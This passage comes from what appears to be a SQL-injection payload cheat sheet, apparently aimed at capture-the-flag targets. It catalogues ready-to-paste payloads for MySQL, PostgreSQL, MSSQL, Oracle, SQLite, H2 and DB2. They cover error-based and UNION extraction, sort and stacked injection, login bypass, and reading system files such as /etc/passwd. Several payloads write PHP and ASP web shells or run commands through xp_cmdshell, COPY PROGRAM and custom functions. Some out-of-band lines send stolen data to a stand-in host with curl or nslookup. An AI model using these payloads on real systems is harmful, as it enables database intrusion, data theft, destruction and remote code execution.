' AND 1=(SELECT JSON_KEYS((SELECT flag)))-- -            -- json err echo
' AND (SELECT x FROM (SELECT flag x FROM secrets)a)
   REGEXP 'x'-- -                                       -- rare
' AND POW(9999,99)=(SELECT flag)-- -                    -- overflow
' AND (SELECT 1 FROM dual WHERE (SELECT flag) REGEXP 'x')-- -

-- PostgreSQL:
' AND 1=CAST((SELECT flag FROM secrets LIMIT 1) AS int)-- -
' AND (SELECT flag FROM secrets LIMIT 1)::int=1-- -
' AND 1=CAST((SELECT flag FROM secrets LIMIT 1) AS numeric)-- -
' AND 1=CAST(version() AS int)-- -                      -- version echo
' AND 1=CAST(current_user AS int)-- -
' AND 1=CAST(current_database() AS int)-- -
' AND 1=CAST((SELECT table_name FROM information_schema.tables
   LIMIT 1) AS int)-- -
' AND (SELECT flag FROM secrets LIMIT 1)::boolean-- -
' AND (SELECT flag FROM secrets LIMIT 1)::jsonb ? 'x'-- -
' AND 1/(SELECT 0 FROM secrets LIMIT 1)=0-- -            -- div-zero if exists
' AND 1/(SELECT CASE WHEN cond THEN 0 ELSE 1 END)=1-- -   -- conditional err
' AND (SELECT CAST(flag AS int) FROM secrets LIMIT 1)=1-- -
' AND CAST(concat(chr(126),(SELECT flag),chr(126)) AS int)-- - -- tilde marks

-- MSSQL:
' AND 1=CONVERT(int,(SELECT TOP 1 flag FROM secrets))-- -
' AND 1=CONVERT(int,@@version)-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 flag FROM secrets)) AND 'x'='x-- -
' AND 1 IN (SELECT TOP 1 flag FROM secrets)-- -
' AND CAST((SELECT TOP 1 flag FROM secrets) AS int)=1-- -
' AND (SELECT TOP 1 flag FROM secrets)=1-- -             -- type mismatch err
'; DECLARE @x nvarchar(4000); SELECT @x=flag FROM secrets;
   RAISERROR(@x,16,1)-- -
'; RAISERROR((SELECT TOP 1 flag FROM secrets),16,1)-- -  -- direct
' AND 1=(SELECT flag FROM secrets WHERE flag=CONVERT(int,flag))-- -

-- Oracle:
' AND 1=utl_inaddr.get_host_name((SELECT flag FROM secrets
   WHERE ROWNUM=1))-- -                                  -- host echo
' AND 1=utl_inaddr.get_host_address((SELECT flag))-- -
' AND 1=ctxsys.drithsx.sn(1,(SELECT flag FROM secrets WHERE
   ROWNUM=1))-- -                                         -- old but gold
' AND 1=ctxsys.ctx_report.token_type(0,(SELECT flag))-- -  -- rare
' AND 1=XMLType((SELECT flag FROM secrets WHERE ROWNUM=1))-- - -- parse err
' AND 1=(SELECT extractvalue(xmltype('<r>'||(SELECT flag)||
   '</r>'),'/r') FROM dual)-- -                            -- parse err
' AND 1=(SELECT dbms_xmlgen.getxml('SELECT '||(SELECT flag)||
   ' FROM dual') FROM dual)-- -
' AND 1=to_number((SELECT flag FROM secrets WHERE ROWNUM=1))-- -
' AND 1=dbms_xdb_version.checkin((SELECT flag))-- -         -- echo variant
' AND 1=dbms_xdb_version.makeversioned((SELECT flag))-- -   -- echo variant
' AND 1=dbms_utility.sqlid_to_sqlhash((SELECT flag))-- -    -- rare
' AND 1=ordsys.ord_dicom.getmappingxpath((SELECT flag),1,1)-- - -- old

-- SQLite — error echo is weak; these surface in some drivers:
' AND 1=CAST((SELECT flag FROM secrets) AS int)-- -      -- no echo, ok
' AND (SELECT flag FROM secrets) REGEXP 'x'-- -           -- fn missing
' AND load_extension('nonexistent.so')-- -               -- error msg
' AND 1=abs((SELECT flag FROM secrets))-- -              -- rare
```

---

## 12. UNION column-count probes

```text
' ORDER BY 1-- -   ' ORDER BY 2-- -   ' ORDER BY 3-- -   ...  ' ORDER BY 30-- -
' ORDER BY 1,2-- - ' ORDER BY 2,1-- - ' ORDER BY 3,2,1-- -
' GROUP BY 1-- -   ' GROUP BY 1,2-- - ' GROUP BY 1,2,3-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT 1-- - ' UNION SELECT 1,2-- - ' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -          -- overshoot
' UNION ALL SELECT NULL,NULL,NULL-- -            -- ALL variant
' UNION DISTINCT SELECT NULL,NULL,NULL-- -       -- DISTINCT variant
' UNION SELECT 'a','b','c'-- -                   -- type probe
' UNION SELECT 0x61,0x62,0x63-- -                -- hex values
' UNION SELECT NULL,'x',NULL-- -                 -- locate reflected col
' UNION SELECT NULL,NULL,'x'-- -
' UNION SELECT 'x',NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,'x',NULL-- -
' UNION SELECT version(),NULL,NULL-- -           -- render test
' UNION SELECT NULL,version(),NULL-- -
' UNION SELECT NULL,NULL,version()-- -
```

`union.md` §2 explains the read-order trick (ORDER BY vs UNION
probing) and which to use when.

---

## 13. ORDER BY / sort injection payloads

```sql
sort=id                     sort=-id                    sort=id desc
sort=id,username            sort=username,id            sort=id,if(1=1,id,name)
sort=if(1=1,id,name)        sort=if(1=2,id,name)        sort=if(cond,id,name)
sort=if(cond,(select sleep(3)),id)
sort=(select if(cond,id,name))
sort=(select case when cond then id else name end)
sort=(select case when cond then name else id end)
sort=(case when (1=1) then id else name end)              [P S O]
sort=rand(cond)             sort=rand(1)                sort=rand(0)
sort=id,if(cond,id,name)    sort=if(cond,id,name),id    sort=abs(cond)
sort=field(cond,'a','b')    sort=elt(cond,'a','b')      [M]
sort=make_set(cond,'a','b') sort=greatest(id,name)      sort=least(id,name)
sort=(select mid(version(),1,1))                          [M]
sort=(select if(ascii(substring(database(),1,1))>100,id,name))
sort=if(ascii(substring((select flag),1,1))>100,id,name)   -- extraction
sort=(select sleep(3))      sort=(select pg_sleep(3))   [P]
sort=id;if(cond)waitfor delay '0:0:3'                     [S stacked]
sort=(select case when cond then 1 else 0 end from dual) [O]
sort=decode(cond,'a','b')   sort=least(id,name)          [O]
sort=length(name)           sort=char_length(name)       sort=octet_length(name)
sort=lower(name)            sort=upper(name)             sort=hex(name)
sort=id%20desc              sort=id%2Cname              sort=id,name desc
```

---

## 14. Stacked-statement payloads

```sql
'; SELECT 1-- -               '; SELECT version()-- -     '; SELECT user()-- -
'; SELECT pg_sleep(3)-- -     '; SELECT SLEEP(3)-- -      '; WAITFOR DELAY '0:0:3'-- -
'; INSERT INTO t VALUES(1)-- - '; UPDATE t SET x=1-- -    '; DELETE FROM t-- -  (careful)
'; DROP TABLE x-- -           '; CREATE TABLE t(x int)-- - '; TRUNCATE t-- -    (careful)
'; EXEC xp_cmdshell 'whoami'-- -                            [S]
'; EXEC master..xp_dirtree 'c:\'-- -                        [S]
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -       [S]
'; DECLARE @x int; SET @x=1; SELECT @x-- -                  [S]
'; COPY (SELECT '') TO PROGRAM 'id'-- -                     [P]
'; COPY t FROM '/etc/passwd'-- -                            [P]
'; COPY (SELECT 'x') TO '/tmp/x'-- -                        [P]
'; ATTACH DATABASE '/tmp/x' AS x-- -                        [L]
'; CREATE TABLE x.t(a); INSERT INTO x.t VALUES('x')-- -    [L]
'; CALL SHELLEXEC('id')-- -                                 [H2]
'; CREATE ALIAS x AS 'java'-- -                             [H2]
'; BEGIN dbms_scheduler.create_job(...); END;-- -          [O]
'; EXECUTE IMMEDIATE 'GRANT DBA TO x'-- -                   [O]
```

---

## 15. OOB payload bundle (DNS/HTTP/UNC)

```sql
-- MySQL (Windows UNC):
' AND LOAD_FILE(CONCAT('\\\\',version(),'.me.com\\x'))-- -
' AND LOAD_FILE(CONCAT('\\\\',hex((SELECT flag)),'.me.com\\x'))-- -
' AND LOAD_FILE('\\\\'+(SELECT user())+'.me.com\\x')-- -

-- MSSQL UNC:
'; DECLARE @x varchar(8000); SET @x=(SELECT TOP 1 flag FROM secrets);
   EXEC master..xp_dirtree '\\'+@x+'.me.com\x';-- -
'; EXEC master..xp_fileexist '\\'+(SELECT TOP 1 flag)+'.me.com\x';-- -
'; EXEC master..xp_dirtree '\\'+@@version+'.me.com\x';-- -
'; EXEC xp_fileexist '\\'+(SELECT db_name())+'.me.com\x';-- -
'; EXEC master..xp_subdirs '\\'+(SELECT user)+'.me.com\x';-- -
' UNION SELECT NULL,CONVERT(int,(SELECT TOP 1 flag))+'.me.com'-- -
   -- int-convert echo not OOB but related

-- Oracle:
' AND 1=utl_inaddr.get_host_name((SELECT flag)||'.me.com')-- -
' AND 1=utl_inaddr.get_host_address((SELECT flag)||'.me.com')-- -
' AND 1=utl_http.request('http://'||(SELECT flag)||'.me.com/')-- -
' AND 1=dbms_ldap.init((SELECT flag)||'.me.com',80)-- -
' AND 1=dbms_ldap.init((SELECT flag)||'.me.com',389)-- -
' AND 1=(SELECT utl_http.request('http://me/'||rawtohex(
   (SELECT flag))) FROM dual)-- -
' AND 1=(SELECT httpuritype('http://'||(SELECT flag)||'.me.com')
   .getclob() FROM dual)-- -
' AND 1=(SELECT extractvalue(xmltype('<?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "http://me/'||(SELECT flag)||
   '.me.com">]><r>&x;</r>'),'/r') FROM dual)-- -
' AND 1=dbms_xmlgen.getxml('SELECT "'||(SELECT flag)||'" FROM dual')-- -

-- PG dblink:
' AND (SELECT dblink_connect('host='||(SELECT flag)||'.me.com
   user=x dbname=y'))-- -
' AND (SELECT dblink('host='||(SELECT flag)||'.me.com','SELECT 1'))-- -
'; COPY t(x) FROM PROGRAM 'curl http://me/$(cat /flag|base64)';-- -
'; COPY t(x) FROM PROGRAM 'nslookup $(cat /flag).me.com';-- -
```

---

## 16. File-read payloads (per DBMS)

```sql
-- MySQL:
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT NULL,LOAD_FILE('/flag')-- -
' UNION SELECT NULL,LOAD_FILE('C:/Windows/win.ini')-- -
' UNION SELECT hex(LOAD_FILE('/bin/ls')),NULL-- -
' UNION SELECT to_base64(LOAD_FILE('/bin/ls')),NULL-- -
' UNION SELECT SUBSTRING(LOAD_FILE('/big'),1,4096),NULL-- -

-- PG:
' UNION SELECT pg_read_file('/etc/passwd'),NULL-- -
' UNION SELECT NULL,pg_read_file('/flag')-- -
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,10000)-- -
' UNION SELECT encode(pg_read_binary_file('/x'),'base64'),NULL-- -
' UNION SELECT NULL,encode(lo_get(lo_import('/etc/passwd')),
   'escape')-- -
' UNION SELECT pg_ls_dir('/var/www/html'),NULL-- -
' UNION SELECT pg_stat_file('/flag'),NULL-- -

-- MSSQL:
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\flag.txt',
   SINGLE_CLOB) x-- -
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\flag.txt',
   SINGLE_NCLOB) x-- -
'; CREATE TABLE t(x nvarchar(max)); BULK INSERT t FROM 'C:\flag.txt';
   SELECT * FROM t-- -
'; EXEC master..xp_dirtree 'C:\inetpub\wwwroot'-- -
'; EXEC master..xp_fileexist 'C:\flag.txt'-- -

-- Oracle:
' UNION SELECT NULL,utl_file.fopen('DIR','flag.txt','r') FROM dual-- -
   -- returns handle not content; full read needs PL/SQL block:
'; DECLARE f utl_file.file_type; b varchar2(4000); BEGIN
   f:=utl_file.fopen('DIR','flag.txt','R'); utl_file.get_line(f,b);
   dbms_output.put_line(b); utl_file.fclose(f); END;-- -

-- SQLite:
' UNION SELECT readfile('/etc/passwd'),NULL-- -
' UNION SELECT CAST(readfile('/flag') AS text),NULL-- -
' UNION SELECT hex(readfile('/bin/ls')),NULL-- -

-- H2:
' UNION SELECT FILE_READ('/etc/passwd'),NULL-- -
' UNION SELECT * FROM CSVREAD('/etc/passwd')-- -
' UNION SELECT NULL,(SELECT x FROM CSVREAD('/etc/passwd','x'))-- -

-- DB2:
' UNION SELECT * FROM TABLE(SYSPROC.ADMIN_READ_FILE('/etc/passwd'))-- -
' UNION SELECT * FROM TABLE(SNAP_GET_FILE('/etc/passwd')) t-- -
```

---

## 17. File-write payloads

```sql
-- MySQL:
' UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE
   '/var/www/html/s.php'-- -
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b63293b3f3e
   INTO DUMPFILE '/var/www/html/s.php'-- -
' UNION SELECT '<?=`$_GET[c]`?>',NULL INTO OUTFILE '/w/s.php'-- -
'; SET GLOBAL general_log='ON';
   SET GLOBAL general_log_file='/var/www/html/x.php';
   SELECT '<?php system($_GET["c"]);?>';-- -

-- PG:
'; COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/x.php';-- -
'; COPY (SELECT $$<?php system($_GET["c"]);?>$$) TO '/w/x.php';-- -
' UNION SELECT lo_export(lo_import('/tmp/x'),'/var/www/s.php'),NULL-- -
   -- via large-object (low priv):
'; INSERT INTO pg_largeobject(loid,pageno,data) VALUES
   (31337,0,decode('<?php system($_GET["c"]);?>','escape'));
   SELECT lo_export(31337,'/var/www/html/s.php');-- -

-- MSSQL:
'; EXEC xp_cmdshell 'echo test > C:\inetpub\wwwroot\t.txt';-- -
'; EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;
   EXEC sp_OAMethod @f,'CreateTextFile',@o OUT,'C:\inetpub\s.asp';
   EXEC sp_OAMethod @o,'WriteLine',null,'<%eval request("c")%>';-- -
'; EXEC sp_OAMethod @f,'CopyFile',null,'C:\x','C:\inetpub\wwwroot\y';-- -

-- Oracle UTL_FILE:
'; DECLARE f utl_file.file_type; BEGIN f:=utl_file.fopen('DIR','x.php',
   'W'); utl_file.put_line(f,'<?php system($_GET[c]);?>');
   utl_file.fclose(f); END;-- -

-- SQLite ATTACH:
'; ATTACH DATABASE '/var/www/html/s.php' AS x;
   CREATE TABLE x.t(a); INSERT INTO x.t VALUES
   ('<?php system($_GET[c]);?>');-- -

-- H2 CSVWRITE:
'; CALL CSVWRITE('/tmp/x','SELECT "<?php system($_GET[c]);?>"');-- -
```

---

## 18. Exec payloads per DBMS

```sql
-- MSSQL xp_cmdshell:
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC xp_cmdshell 'dir c:\';-- -
'; EXEC xp_cmdshell 'type c:\flag.txt';-- -
'; EXEC xp_cmdshell 'powershell -c "cat c:\flag.txt"';-- -
'; EXEC xp_cmdshell 'powershell -enc <b64>';-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; CREATE TABLE t(x nvarchar(4000)); INSERT INTO t EXEC
   xp_cmdshell 'dir c:\';-- -
   ' UNION SELECT x,NULL FROM t-- -                        -- read output

-- MSSQL OLE:
'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;-- -
'; DECLARE @o int; EXEC sp_OACreate 'wscript.shell',@o OUT;
   EXEC sp_OAMethod @o,'run',null,'cmd /c whoami > c:\inetpub\o.txt';-- -
'; EXEC sp_OACreate 'Shell.Application',@o OUT;
   EXEC sp_OAMethod @o,'ShellExecute',null,'cmd.exe','/c id','','',0;-- -

-- MSSQL CLR:
'; EXEC sp_configure 'clr enabled',1; RECONFIGURE;-- -
'; CREATE ASSEMBLY x FROM 0x4d5a...; CREATE PROCEDURE x AS EXTERNAL
   NAME x.x.x;-- -

-- PG COPY PROGRAM:
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/x';-- -
'; COPY t(x) FROM PROGRAM 'cat /flag';-- -
'; COPY t(x) FROM PROGRAM 'sh -c "id > /tmp/x"';-- -

-- PG dblink (needs dblink ext):
' AND (SELECT dblink('host=x user=y dbname=z','SELECT 1'))-- -
'; CREATE EXTENSION IF NOT EXISTS dblink;-- -

-- PG untrusted PL:
'; CREATE FUNCTION x() RETURNS void AS $$import os;os.system("id")$$
   LANGUAGE plpython3u;-- -

-- MySQL UDF:
'; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';-- -
'; SELECT sys_exec('id');-- -
'; SELECT sys_eval('id > /tmp/x');-- -

-- Oracle Java SP (rce-paths §5):
'; CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED x AS
   'import java.io.*; public class x { public static String r(String c)
   throws Exception { return new java.util.Scanner(
   Runtime.getRuntime().exec(c).getInputStream()).useDelimiter("\\A")
   .next(); } }';-- -

-- Oracle scheduler:
'; BEGIN dbms_scheduler.create_job(job_name=>'x',
   job_type=>'EXECUTABLE',job_action=>'/bin/sh -c "id > /tmp/o"',
   enabled=>TRUE); END;-- -

-- SQLite:
' UNION SELECT load_extension('/tmp/evil.so'),NULL-- -
' UNION SELECT writefile('/tmp/x',hexblob('41')),NULL-- -

-- H2 CREATE ALIAS:
'; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd)
   throws java.io.IOException { return new java.util.Scanner(
   Runtime.getRuntime().exec(cmd).getInputStream())
   .useDelimiter("\\A").next(); }$$; CALL SHELLEXEC('id');-- -
```

---

## 19. Login/auth bypass payloads — see `auth-bypass.md`

```text
admin'-- -        admin'--          admin'#          admin'/*
' OR '1'='1       ' OR '1'='1'-- -  ' OR '1'='1'#    ' OR '1'='1'/*
' OR ''='         ' OR 'x'='x       ' OR 'x'='x'-- - ' OR 'x'='x'#
' OR 1=1-- -      ' OR 1=1#         ' OR true-- -    ' OR 1-- -
admin' OR '1'='1  admin' OR '1'='1'-- -  admin' OR '1'='1'#
admin' OR '1'='1' LIMIT 1-- -
admin' OR 1=1 LIMIT 1-- -
x' OR '1'='1' OR 'x'='y             -- comment-free
x' OR '1'='1' AND 'x'='x            -- balanced-close
' UNION SELECT 1,'admin','pass'-- - -- forged row
' UNION SELECT NULL,'admin',MD5('pass')-- -
' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -
```

---

## 20. The "keep it sorted" index

| Need | Section |
|---|---|
| quote/context probe | §1 |
| true/false boolean | §2 |
| DBMS fingerprint | §3 |
| version/user/db | §4 |
| list databases | §5 |
| list tables | §6 |
| list columns | §7 |
| pull rows | §8 |
| blind extract | §9 |
| time delay | §10 |
| error echo | §11 |
| column count | §12 |
| sort injection | §13 |
| stacked | §14 |
| OOB | §15 |
| file read | §16 |
| file write | §17 |
| exec | §18 |
| auth bypass | §19 |

Transforms to get past a WAF live in `waf-evasion.md`; the per-DBMS
catalogue depth lives in the `mysql.md`/`postgresql.md`/`mssql.md`/
`oracle.md`/`sqlite.md`/`mariadb.md`/`multi-dbms.md` files; the
extraction-loop mechanics live in `advanced-extraction.md` and
`boolean-blind.md`.
